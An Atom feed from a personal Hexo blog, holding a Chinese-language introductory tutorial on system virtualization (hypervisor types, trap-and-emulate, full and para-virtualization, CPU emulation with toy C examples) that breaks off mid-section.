<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>arttnba3的秘密小屋</subtitle>
  <link href="http://blog.arttnba3.cn/atom.xml" rel="self"/>
  
  <link href="http://blog.arttnba3.cn/"/>
  <updated>2022-09-03T10:27:58.846Z</updated>
  <id>http://blog.arttnba3.cn/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【VIRT.0x02】系统虚拟化导论</title>
    <link href="http://blog.arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/"/>
    <id>http://blog.arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/</id>
    <published>2022-08-28T20:39:22.000Z</published>
    <updated>2022-09-03T10:27:58.846Z</updated>
    
    <content type="html"><![CDATA[<p>虚拟化方向YLG速成入门指北</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>因为笔者最近不知道为什么开始做 X86 虚拟化这一块的工作了（大雾），而虚拟化的知识点比较杂也比较乱，所以特地开这一篇博客简单记录一下虚拟化的一些基本概念</p><h1 id="0x01-Virtualization-Basis"><a href="#0x01-Virtualization-Basis" class="headerlink" title="0x01. Virtualization Basis"></a>0x01. Virtualization Basis</h1><h2 id="一、虚拟化的基本概念"><a href="#一、虚拟化的基本概念" class="headerlink" title="一、虚拟化的基本概念"></a>一、虚拟化的基本概念</h2><p>什么是虚拟化？狭义地说，大家在日常生活中说到的虚拟化主要指的还是 <em>虚拟机</em> （Virtual Machine），即<strong>通过虚拟化技术将一台计算机虚拟为多台逻辑计算机</strong>——这其实是虚拟化技术中的一个抽象粒度为单个计算机的分支：<code>系统虚拟化</code></p><p>在计算机科学当中，<strong>虚拟化</strong>（Virtualization）指的其实是一种「<strong>将计算机的各种实体资源进行逻辑抽象，从而呈现出不同的虚拟资源</strong>」的资源管理技术。利用虚拟化技术，我们可以打破实体结构间不可切割的特性——一份实体资源可以对用户呈现为多份虚拟资源，多份实体资源也可以呈现为一份物理资源。</p><p>通过虚拟化技术，我们可以实现资源的动态分配、灵活调度、跨域共享等，从而提高资源的利用率。</p><p><img src="https://s2.loli.net/2022/08/09/Tj6qGVH82suwhMy.png" alt="image.png"></p><blockquote><p>这里所说的实体资源包括<strong>CPU、内存、磁盘空间、网络适配器</strong>等。</p></blockquote><p>这里笔者摘抄一段来自一本经典的虚拟化技术教材的叙述：</p><blockquote><p>抽象来说，虚拟化是资源的逻辑表示，它不受物理限制的约束。具体来说，虚拟化技术的实现形式是在系统中加入一个虚拟层，虚拟化层将下层的资源抽象成另一形式的资源，提供给上层使用。通过空间上的分割、时间上的分时以及模拟，虚拟化可以将一份资源抽象成多分。反过来，虚拟化也可以将多份资源抽象成一份。</p><p>——《系统虚拟化：原理与实现》</p></blockquote><p>即虚拟化技术的实现其实源自于现代计算机系统自下而上的多层抽象的结构：「<strong>每个层次都向上一层次呈现一个抽象，每一层只需要知道下层的抽象接口，而无需了解其内部运作机制</strong>」——我们不难想到的是，<strong>只要我们能够通过某种方式向上层提供表现相同的抽象接口，在上层看来我们就是正常的该层所提供的资源，从而就实现了对该层的虚拟化。</strong></p><p><img src="https://s2.loli.net/2022/08/02/lDLgE6tyNe87M12.png" alt="image.png"></p><p>由此，从物理层与虚拟层的两侧来看，我们便有了虚拟化中的两个重要定语：</p><ul><li>「<strong>Host</strong>」：物理资源方</li><li>「<strong>Guest</strong>」：虚拟资源方</li></ul><p>根据资源的不同，在这两个定语之后我们可以接不同的名词：例如我们将一台物理机器称之为 <code>Host Machine</code> （宿主机），将运行在其上的虚拟机称之为 <code>Guest Machine</code> （客户机）；相应地，在宿主机上若运行有操作系统，则称之为 <code>Host OS</code>，而运行在虚拟机中的操作系统称之为 <code>Guest OS</code></p><p>由此，我们将位于不同抽象层上的虚拟化分为如下类：</p><ul><li><strong>硬件抽象层上的虚拟化</strong>：通过虚拟硬件抽象层来实现虚拟机器，为 Guest OS 呈现与物理硬件相同或相类似的硬件抽象层，也称之为「<strong>系统级虚拟化</strong>」（例如VMWare、Xen）</li><li>操作系统层上的虚拟化：通常指的是操作系统内核可以提供多个互相隔离的用户态实例（通常称之为容器），这些用户态实例对其用户而言就像是一台真实的计算机，有着自己独立的网络、文件系统等（例如 VServer）</li><li>库函数层上的虚拟化：通过虚拟化操作系统的应用级库函数的服务接口，使得应用程序不需要修改就可以在不同的操作系统中无缝运行（例如 Wine、WSL）</li><li>编程语言层上的虚拟化：这类虚拟机运行的是进程级别的不存在于硬件上的虚拟体系结构，其程序代码由虚拟机的运行时支持系统<strong>翻译</strong>成机器语言后再执行，属于进程级的虚拟化（例如 JVM）</li></ul><blockquote><p>例如 Linux kernel 当中的 VFS 便是非常符合虚拟化这一概念的子系统：从上层调用的角度而言，我们所看到的都是统一的 API 接口，不同文件系统的具体实现则被隐藏在了 VFS 层的下方。我们只需要知道在这一抽象层中 open、read、write 等抽象 API 的用法，而无需关注底层的 ext4 或是 ntfs 的内部实现。</p><p>虚拟化亦是如此，从 Guest 侧我们所能看到的也只是统一的虚拟资源的接口，或者说 Host 为我们呈现出了虚拟化的资源接口，其表现的行为与实体设备是一致的。</p></blockquote><p>我们日常所说的虚拟化技术主要是<strong>硬件抽象层上的虚拟化</strong>，即「<strong>系统级虚拟化</strong>」：通过虚拟化技术将一台计算机虚拟为多台逻辑计算机</p><p>针对实体资源类型的不同，我们还可以再细分为：</p><ul><li><strong>计算虚拟化</strong>：针对 CPU 和内存资源进行虚拟化</li><li><strong>网络虚拟化</strong>：针对网络链路资源进行虚拟化</li><li><strong>IO虚拟化</strong>：针对 IO 资源进行虚拟化</li><li><strong>存储虚拟化</strong>：针对磁盘存储资源虚拟化</li></ul><h2 id="二、虚拟化与云计算"><a href="#二、虚拟化与云计算" class="headerlink" title="二、虚拟化与云计算"></a>二、虚拟化与云计算</h2><p>说到虚拟化就不得不提云计算这一“新兴事物”（其实在笔者写下这句话的时候云计算技术已经发展多年了hhh），似乎每次提到云计算总是离不开虚拟化这个词，那先来和笔者一起看一下「什么是云计算吧」（笑）</p><ul><li>「<strong>云计算</strong>」（Cloud computing）即<strong>通过网络向用户按需提供可动态伸缩的计算服务与 IT 资源</strong>，云服务厂商将多份实体资源以一定形式进行整合后，将其称之为「<strong>云</strong>」，通过互联网按需向用户提供其所需的资源</li></ul><p>相信大家已经注意到其相似之处了——<strong>虚拟化技术便是云计算服务的技术基石之一</strong></p><ul><li>通过虚拟化可以解决数据中心（IDC）资源整合的问题，对计算、存储等资源进行标准化</li><li>通过虚拟化可以将资源进行更为合理的切割调度，从而充分利用硬件资源</li></ul><p><img src="https://s2.loli.net/2022/08/08/5ncJFCOLByoqbPM.png" alt="image.png"></p><blockquote><p>当然云计算的基石不仅仅是虚拟化，但是这篇博客主要讲的还是系统虚拟化而不是云计算（笑）</p></blockquote><p>根据提供的资源服务的类型不同，我们将云服务分为以下三种类型：</p><ul><li><p><strong>Infrastructure-as-a-Service</strong>（IaaS）：云厂商向用户提供<strong>完整的基础设施</strong>，即提供<strong>云硬件环境</strong>，包括计算（CPU）、存储（硬盘）、网络等，用户需要自行在云硬件环境上搭建自己需要的服务</p><blockquote><p>通俗点说就是卖服务器（笑）</p></blockquote></li><li><p><strong>Platform-as-a-Service</strong>（PaaS）：云厂商向用户提供<strong>软件部署平台</strong>，即提供服务器平台或者开发环境，用户可以直接在云平台上进行开发部署等工作，<strong>而无需管理底层的基础设施</strong></p><blockquote><p>比如说微软的 Azure 和 Redhat 的 OpenShift</p></blockquote></li><li><p><strong>Software-as-a-Service</strong>（SaaS）：云厂商向用户提供<strong>具体的软件服务</strong>，用户可以通过网络直接使用厂商提供的服务</p><blockquote><p>比如说腾讯的共享文档就是一个典型的 SaaS</p></blockquote></li></ul><p><img src="https://s2.loli.net/2022/08/07/nF3wLu5cfZQtpPK.png" alt="image.png"></p><p>我们按照其部署形式的不同还可以将云分为以下三类：</p><ul><li><strong>公有云</strong>：云服务的基础设施部署在云厂商的机房里，由云厂商向用户提供云上资源，<strong>云资源实体由多个用户共享</strong>（一台物理服务器上可能跑多个用户的虚拟机）</li><li><strong>私有云</strong>：云服务的基础设施部署在用户自己的机房里（部署在内部自有机房的叫内部私有云，部署在外部托管机房的叫外部私有云），由云厂商提供部署服务或是用户自行部署，<strong>云资源实体由用户独享</strong></li><li><strong>混合云</strong>：用户在使用云厂商提供的云资源的同时自己也搭建了一个云</li></ul><p><img src="https://s2.loli.net/2022/08/07/SrJDGa6shAWq4ul.png" alt="image.png"></p><blockquote><p>现在网上各种关于云计算的文章包括像百度百科这样的，<strong>几乎没有一个能准确给这个概念下一个最基本的定义的</strong>，全篇都是各种假大空的套话，看着让人血压升高……</p><blockquote><p><del>👴觉得百度百科就是个🐓⑧</del></p></blockquote><p>云计算本质上其实就是一个通过互联网向用户按需提供可动态伸缩的 IT 资源，<strong>至于用户拿到这个计算资源后要做什么笔者并不关心</strong>（笑）</p></blockquote><h1 id="0x02-系统虚拟化概述"><a href="#0x02-系统虚拟化概述" class="headerlink" title="0x02. 系统虚拟化概述"></a>0x02. 系统虚拟化概述</h1><h2 id="一、基本模型"><a href="#一、基本模型" class="headerlink" title="一、基本模型"></a>一、基本模型</h2><p>对于一台计算机，我们可以简单地抽象成下图所示的三层模型，从下往上分别是<strong>物理硬件层、操作系统层、应用程序层</strong>：</p><p><img src="https://s2.loli.net/2022/08/02/5jwhR2HnDTCp3q8.png" alt="image.png"></p><p>我们首先给「虚拟机」下一个定义：</p><ul><li><strong>虚拟机</strong>（Virtual Machine）是计算机的虚拟化实例，拥有自己的虚拟硬件（如 CPU、内存、设备等），可执行与计算机几乎完全相同的功能，包括运行应用和操作系统</li></ul><p>即我们可以把一个虚拟机实例看作是一台具有如上图所示层次的<strong>逻辑的计算机</strong></p><p>但虚拟机的运行是需要有物理环境所支撑的，同时虚拟机实例也是不可能凭空出现&#x2F;凭空消失的，因此接下来我们引入一个新的概念——<strong>VMM</strong>，即 <code>Virtual Machine Monitor</code>，又称 <code>Hypervisor</code>，这是一个介于 VM 与硬件中间的软件层，<strong>其负责 VM 的创建、销毁等工作，并为 VM 提供了运行环境</strong>：「虚拟硬件抽象层」</p><p><img src="https://s2.loli.net/2022/08/05/C4czg3kVIKAJb5L.png" alt="image.png"></p><p>1974年，Gerald J. Popek 与 Robert P. Goldberg 发表了合作论文<a href="https://dl.acm.org/doi/pdf/10.1145/361011.361073">《Formal Requirements for Virtualizable Third Generation Architectures》</a>，在论文中提出了满足虚拟化系统结构的 VMM 的三个充分条件，称之为<code>Popek and Goldberg virtualization requirements</code>：</p><ul><li><strong>等价性</strong>（essentially identical）：一个运行于 VMM 下的程序，<strong>其行为应与直接运行于等价物理机上的同程序的行为完全一致</strong></li><li><strong>资源控制</strong>（resource control）：VMM 对虚拟资源具有<strong>完全的控制能力</strong>，包括资源的分配、监控、回收</li><li><strong>效率性</strong>（efficiency）：机器指令中经常使用的那一部分应在没有 VMM 干预下<strong>直接在硬件上执行</strong></li></ul><p>由此，论文中提出了两种 Hypervisor 方案，这也成为了现在最主流的两种方案：</p><ul><li><p><code>Type I</code> ：<strong>Hypervisor 直接运行在硬件上，即以 Hypervisor 作为 Host OS 直接管控硬件资源</strong>。例如 <code>VMware ESXI</code> 便是采用此种架构的 Hypervisor</p><p><img src="https://s2.loli.net/2022/08/03/Mn2cKxtpXdibHRG.png" alt="image.png"></p></li><li><p><code>Type II</code>：<strong>Hypervisor 运行在传统的操作系统上，与其他应用程序并行运行</strong>。例如 <code>Qemu</code> 与 <code>VMware Player</code> 便是采用此种架构的 Hypervisor</p><p><img src="https://s2.loli.net/2022/08/03/FNComsjbSdTheL6.png" alt="image.png"></p></li></ul><p>具体到技术细节上，我们应该如何去实现上述的虚拟化方案呢？我们先来介绍一个概念——「敏感指令」，即<strong>操作特权资源的指令</strong>，例如 IO 操作、修改页表寄存器等</p><p>为了我们的 VMM 能够完全地控制系统资源，<strong>敏感质量必须在 VMM 的监控审查下完成，或是经由 VMM 来完成</strong>。因此，若一个架构中所有的特权指令都是敏感质量，则我们可以使用<strong>特权级压缩</strong>（Ring Compression）的方式来实现虚拟环境：</p><ul><li>VMM 运行在最高特权级上，Guest VM 运行在低特权级上，当 Guest VM 执行到敏感指令时，其便会陷入位于最高特权级的 VMM，此时便能由 VMM 模拟敏感指令的行为</li></ul><p>——这就是系统虚拟化最典中典的模型<strong>「Trap &amp; Emulate」</strong>：</p><ul><li>我们将操作系统分为两个运行模式：「用户模式（user mode）」与「特权模式（privileged mode）」，在用户模式下只能直接执行非特权指令，当执行到特权指令时便会触发异常，从而陷入特权模式对应的处理代码中</li><li>Guest VM 运行在用户模式下，从而使得普通指令可以直接放在 CPU 上执行，当 Guest VM 执行到<strong>敏感指令</strong>时，便会<strong>触发异常，此时由 VMM 介入并模拟其应有的行为</strong></li></ul><p>因此，一个 ISA 是否可以虚拟化，其核心就在于<strong>敏感指令是否都是特权指令</strong></p><p><img src="https://s2.loli.net/2022/08/04/cipfjY89LsgIlVb.png" alt="知乎偷的图"></p><p>而由于硬件实体资源也有着不同的类型，我们将对不同类型实体资源的虚拟化技术分为如下类型：</p><ul><li>CPU 虚拟化</li><li>内存虚拟化</li><li>I&#x2F;O 虚拟化</li></ul><h2 id="二、遇到的问题"><a href="#二、遇到的问题" class="headerlink" title="二、遇到的问题"></a>二、遇到的问题</h2><p>在虚拟化技术的发展初期，在个人计算机领域广泛使用的 x86 架构并没有对虚拟化的经典架构「Trap &amp; Emulate」提供很好的支持，存在着对系统虚拟化的支持缺陷，<strong>系统虚拟化并不能直接而有效的实现</strong></p><p>Intel 分级保护环将权限分为 ring0~ ring3，其中操作系统内核运行在 ring0 权限而用户进程运行在 ring3 权限</p><p><img src="https://i.loli.net/2021/02/22/yQXZhLEHVn1b3uC.png"></p><p>在系统虚拟化的经典架构「Trap &amp; Emulate」中， Guest OS 全部运行在 ring3，当涉及到一些敏感指令时，VM 触发 General Protection 异常，由 VMM 进行截获并处理，<strong>但不是所有敏感指令都是特权指令，不是所有的敏感指令都有触发异常以让 VMM 介入的机会</strong>， x86 架构中<strong>一共有 17 条非特权敏感指令</strong>：</p><p><img src="https://s2.loli.net/2022/08/04/qirIbepFOA4U5xf.png" alt="image.png"></p><p>这些指令<strong>直接违反了 <code>Popek and Goldberg virtualization requirements</code> ，从而使得 x86 不是一个可以虚拟化的架构</strong></p><blockquote><p>例如在 x86 下我们想要用 popf 修改 eflags 的中断开关位（IF）时，若我们在用户态下进行这样的操作，<strong>则会直接被硬件所忽视，而不会引起异常</strong>，这令 VMM 无法介入</p></blockquote><p>“硬件不够，软件来凑”。因此在硬件还未提供对虚拟化的足够支持之前，Hypervisor 只能从软件层面下功夫，于是出现了两种纯软件虚拟化技术：「模拟执行」（VMWare）与「直接源代码改写」（Xen）</p><p>在软件虚拟化技术已经发展成熟多年之后，x86 架构对虚拟化的支持才姗姗来迟：「硬件辅助虚拟化」（Intel VT）开始出现在人们的视野当中</p><h2 id="三、实现方案"><a href="#三、实现方案" class="headerlink" title="三、实现方案"></a>三、实现方案</h2><h3 id="I-完全虚拟化（Full-virtualization）"><a href="#I-完全虚拟化（Full-virtualization）" class="headerlink" title="I.完全虚拟化（Full-virtualization）"></a>I.完全虚拟化（Full-virtualization）</h3><p>完全虚拟化技术提供一个<strong>完整的虚拟化硬件环境</strong>，允许<strong>未经修改的 Guest OS 直接在 VM 上运行</strong>，在 Guest OS 的视角，其与运行在真实的物理平台上一般无二</p><p>完全虚拟化意味着 Guest OS 会将操作正常的处理器、内存、I&#x2F;O 设备那样在虚拟化硬件环境中操作，因此这需要 VMM 能够正确处理 Guest OS 所有可能的行为，因此这需要对应的架构满足 <code>Popek and Goldberg virtualization requirements</code></p><p>由于 x86 架构的硬件在最初并没有对虚拟化提供很好的支持，因此完全虚拟化经历了两个阶段：</p><h4 id="1）「软件辅助的完全虚拟化」"><a href="#1）「软件辅助的完全虚拟化」" class="headerlink" title="1）「软件辅助的完全虚拟化」"></a>1）「软件辅助的完全虚拟化」</h4><p>纯软件实现的完全虚拟化主要依赖两个技术：</p><ul><li><strong>「优先级压缩」</strong>（Ring Compression）：<strong>即 VMM 与 GUest VM 运行在不同的特权级上</strong>。例如 <code>VMM 运行在 ring0、Guest OS kernel 运行在 ring1、Guest APP 运行在 ring3 </code>，当 Guest OS 想要尝试执行特权指令时，便会触发异常，此时 VMM 便能截获该特权指令并进行模拟执行。但正如我们前面所说，<strong>不是所有敏感指令都是特权指令</strong>，这使得部分敏感指令无法被 VMM 截获并处理，从而导致了虚拟化平台与物理平台表现的行为不一致</li><li><strong>「二进制代码翻译」</strong>（Binary Translation）：二进制代码翻译被引入来<strong>处理对虚拟化不友好的指令</strong>，其思想便是扫描并修改 Guest VM 的二进制代码，将难以虚拟化的指令转化为支持虚拟化的指令（例如显式地触发异常让 VMM 得以介入），对于非敏感指令则仍是直接执行。这在确保了性能的情况下实现了完全虚拟化</li></ul><p><img src="https://s2.loli.net/2022/08/05/AqLhpontmYHCS8T.png" alt="image.png"></p><blockquote><p> VMware 与 Qemu 便都是采用了二进制代码翻译的支持完全虚拟化的虚拟机软件，不过最初的 Qemu 更类似于【解释执行】的模式</p></blockquote><p>虽然在优先级压缩与二进制代码翻译技术的配合下 x86 架构成功地实现了完全虚拟化，但是这种“打补丁”的方式很难在架构上保证完整性，因此 x86 厂商最终在硬件上加入了对虚拟化的支持，从硬件架构层面实现了完全虚拟化</p><h4 id="2）「硬件辅助的完全虚拟化」"><a href="#2）「硬件辅助的完全虚拟化」" class="headerlink" title="2）「硬件辅助的完全虚拟化」"></a>2）「硬件辅助的完全虚拟化」</h4><p>在纯软件虚拟化技术发展多年后，x86 架构对虚拟化的支持终于姗姗来迟：Intel 与 AMD 分别推出了自家的硬件虚拟化技术 Intel VT 与 AMD-v，在硬件层面添加了对虚拟化的支持，使得 x86 架构终于成为一个符合 <code>Popek and Goldberg virtualization requirements</code>的 ISA（Infrastructure Set Architecture），从而得以实现完全虚拟化</p><p>硬件辅助虚拟化本质上是通过在 Guest OS 与硬件中间再添加一个 VMM 中间层来实现的，<strong>由硬件负责截获 OS 对敏感指令的执行与对敏感资源的访问，并通过异常的方式报告给 VMM</strong>，从而从硬件层面实现了 <code>Popek and Goldberg virtualization requirements</code></p><p><img src="https://s2.loli.net/2022/08/05/1rfEzK89DG6Moml.png" alt="image.png"></p><p>以 <code>Intel VT-x</code> 技术为例，其在硬件架构上将 CPU 的运行模式分为两种：<strong>「Non-Root Mode」与「Root Mode」</strong>，这两个运行模式都有着各自的分级保护环，其中 Host OS 与 VMM 运行在 Root Mode 下而 Guest OS 则运行在 Non-Root Mode 下</p><p>Root Mode 与原有的运行模式一般无二，在 Non-Root Mode下非敏感指令可以直接在硬件上执行，当 Guest OS 运行了敏感指令时，硬件便会捕获到这一行为，切换到 Root Mode 并将之报告给 VMM，由 VMM 处理好后再恢复到 Non-Root Mode 中继续 Guest OS 的运行，<strong>这从硬件层面实现了「Trap &amp; Emulate」模型</strong></p><p><img src="https://s2.loli.net/2022/08/05/n9TRrsCkKZvGE3U.png" alt="image.png"></p><h3 id="II-半虚拟化（Para-virtualization）"><a href="#II-半虚拟化（Para-virtualization）" class="headerlink" title="II.半虚拟化（Para-virtualization）"></a>II.半虚拟化（Para-virtualization）</h3><p>半虚拟化技术最初的目的也是为了解决 x86 架构无法实现经典虚拟化架构的问题，其<strong>通过修改操作系统内核的代码，使得操作系统内核完全避免这些难以虚拟化的指令</strong>，从而在 x86 架构下实现虚拟化。在半虚拟化技术中，Guest OS 能够感知到自己运行在虚拟化环境中，当涉及到敏感指令的执行或是对敏感资源的访问时，Guest OS 通过名为 <code>Hypercall</code> 的 API 陷入 VMM 中（通常通过陷阱等方式实现），由 VMM 进行相应的操作后再重新返回 VM 中的 Guest OS 继续执行</p><p><img src="https://s2.loli.net/2022/08/05/MhAJEnmCSBzoUVW.png" alt="image.png"></p><blockquote><p>Xen 便是采用了这一模式的虚拟化软件</p></blockquote><p>半虚拟化需要对 OS kernel 的代码进行<strong>大量的修改</strong>，从而使得其支持半虚拟化技术，因此 Windows 这样的闭源操作系统最初是不支持半虚拟化的</p><h2 id="四、libvirt"><a href="#四、libvirt" class="headerlink" title="四、libvirt"></a>四、libvirt</h2><p>众所周知系统虚拟化平台不止一种（VMWare、Xen、KVM、…），管理起来较为麻烦，因此 <strong>libvirt</strong> 应运而生</p><p><code>libvirt</code> 是一个<strong>专门用于管理虚拟化平台的工具包</strong>，其提供了用于管理硬件虚拟化的<strong>开源API</strong>（libvirt API）、<strong>守护进程</strong>（libvirtd）与<strong>管理工具</strong>（virsh），可以用于管理现在主流的大部分 VMM：</p><p><img src="https://s2.loli.net/2022/08/08/tUSvuapWKl6dx9z.png" alt="image.png"></p><h1 id="0x03-CPU-虚拟化"><a href="#0x03-CPU-虚拟化" class="headerlink" title="0x03. CPU 虚拟化"></a>0x03. CPU 虚拟化</h1><p>CPU 虚拟化是系统虚拟化技术中最核心的部分，因为 CPU 是计算机中最核心的组件，直接控制着整个系统的运行，同时内存访问（内存虚拟化）与 I&#x2F;O 操作（I&#x2F;O虚拟化）也都直接依赖于 CPU，因此 CPU 虚拟化是系统虚拟化技术中的核心</p><p>在 Gerald J. Popek 与 Robert P. Goldberg 的合作论文<a href="https://dl.acm.org/doi/pdf/10.1145/361011.361073">《Formal Requirements for Virtualizable Third Generation Architectures》</a> 中提出了满足虚拟化系统结构的 VMM 的三个充分条件：等价性，资源控制，效率性。为了满足这个条件， CPU 虚拟化使用的经典模型是「Trap &amp; Emulate」，使用<strong>特权级压缩</strong>（Ring Compression）的方式来实现虚拟环境：</p><ul><li>Hypervisor 运行在最高特权级上，Guest VM 运行在低特权级上，Guest VM 在硬件上直接执行非敏感指令，当 Guest VM 执行到敏感指令时，其便会陷入位于最高特权级的 Hypervisor ，此时便能由 Hypervisor 模拟敏感指令的行为</li><li>当发生 virtual CPU 调度时，我们将 vCPU 的状态保存，恢复 Hypervisor 状态，Hypervisor 完成其行为后进行下一 virtual CPU 的调度，恢复下一 vCPU 的状态并恢复执行</li></ul><p><img src="https://s2.loli.net/2022/08/11/SvO9ewNdxIbsLqV.png" alt="image.png"></p><h2 id="一、纯软件实现虚拟化"><a href="#一、纯软件实现虚拟化" class="headerlink" title="一、纯软件实现虚拟化"></a>一、纯软件实现虚拟化</h2><p>前文我们已经指出 x86 架构存在<strong>非特权敏感指令，直接导致 VMM 无法截获 x86 VM 的敏感行为</strong>，这违反了<code>Popek and Goldberg virtualization requirements</code>，因此在硬件对虚拟化的支持出现之前，虚拟化厂商只好先从软件层面下手</p><h3 id="I-模拟-amp-解释执行"><a href="#I-模拟-amp-解释执行" class="headerlink" title="I. 模拟 &amp; 解释执行"></a>I. 模拟 &amp; 解释执行</h3><p><strong>「模拟」</strong>（Emulate）技术的出现其实早于虚拟化，纯软件的模拟本质上就是通过编写能够呈现出与被模拟对象相同行为的应用程式从而达到运行非同构平台应用程序的效果</p><p>模拟技术不仅能够应用于程序级别的模拟，还能应用于系统级别的模拟：CPU 运行的本质行为其实就是<strong>从 PC 寄存器所指内存区域中不断取出指令解码执行</strong>，我们不难想到的是，实现一个虚拟机最简单粗暴的方法便是通过<strong>模拟每一条指令对应的行为，从而使得 VM 的行为对 VMM 而言是完全可控的</strong></p><blockquote><p>例如，对于 <code>mov rax, rbx</code> 这样的指令，我们可以使用下面的程序来模拟：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">x86_regs</span>&#123;</span><br>    <span class="hljs-type">uint64_t</span> rax;<br>    <span class="hljs-type">uint64_t</span> rbx;<br>    <span class="hljs-type">uint64_t</span> rcx;<br>    <span class="hljs-type">uint64_t</span> rdx;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">mov_regs</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> *to, <span class="hljs-type">uint64_t</span> *from)</span><br>&#123;<br>    *to = *from;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">mov_rax_rbx</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> x86_regs *regs)</span><br>&#123;<br>    mov_regs(&amp;regs-&gt;rax, &amp;regs-&gt;rbx);<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>实现模拟技术的原理也是最简单的——我们可以通过<strong>「解释执行」</strong>的方式来实现模拟技术：</p><ul><li>模拟器程序不断地从内存中读取指令，并模拟出每一条指令的效果，周而复始</li></ul><p>这样，从某种程度而言，<strong>每一条指令在执行时都完成了“陷入”</strong>，因此我们可以使用模拟技术解决虚拟化的漏洞，同时还能模拟与物理机不同架构的虚拟机</p><p><img src="https://s2.loli.net/2022/08/12/ZCSrkJIfeihDRwF.png" alt="image.png"></p><p><strong>Qemu</strong>——<code>Quick Emulator</code> 本质上便是一个模拟器，其<strong>完整地模拟了一套包括各种外设在内的计算机系统</strong></p><blockquote><p>例如以下便是笔者实现的一个最最最最简陋的模拟器架构，实际的架构会比这复杂得多：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CPU</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">regs</span> <span class="hljs-title">regs</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu</span> *<span class="hljs-title">cpu</span>[];</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">memory</span> *<span class="hljs-title">mm</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bus</span> *<span class="hljs-title">bus</span>;</span><br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">start_a_new_vm</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> disk *disk)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span> <span class="hljs-title">vm</span> =</span> new_vm(<span class="hljs-string">&quot;x86&quot;</span>, disk);<br>    <br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">instruction</span> <span class="hljs-title">insn</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exec_result</span> <span class="hljs-title">res</span>;</span><br>        <br>        fetch_next_insn(vm, &amp;insn);<br>        vm_exec_insn(vm, &amp;insn, &amp;res);<br><br>        <span class="hljs-keyword">switch</span> (res.type) &#123;<br>            <span class="hljs-keyword">case</span> EXIT_VM:<br>                vm_stop(vm);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> RESOURCE_ACCESS:<br>                vm_access_resource(vm, &amp;res);<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>不过基于解释执行的模拟技术有着一个非常致命的缺点——<strong>性能极差</strong>，因为每一条指令都需要经过 VMM 的解析后再由 VMM 模拟执行，哪怕最简单的一条指令也可能需要分解成多个步骤与多次内存访问，效率极低</p><p>让我们重新审视我们为什么需要在 x86 架构上使用模拟技术来实现虚拟机：非特权敏感指令的存在打破了 <code>Popek and Goldberg virtualization requirements</code>，但<strong>非特权敏感指令仅是少数，大部分指令我们仍能直接在物理硬件上运行</strong>，因此基于模拟技术进行改进的虚拟化技术出现了：<code>扫描 &amp; 修补</code> 与 <code>二进制翻译</code></p><h3 id="II-扫描-amp-修补"><a href="#II-扫描-amp-修补" class="headerlink" title="II. 扫描 &amp; 修补"></a>II. 扫描 &amp; 修补</h3><p>虚拟化场景下的虚拟机大都是与物理机有着相同的 ISA，因此我们并没有必要采用纯模拟的技术实现虚拟机，而是可以<strong>让非敏感指令直接在硬件上执行，通过某种方式让非特权敏感指令陷入 VMM</strong>，从而重新实现 Trap &amp; Emulate 模型</p><p><strong>「扫描 &amp; 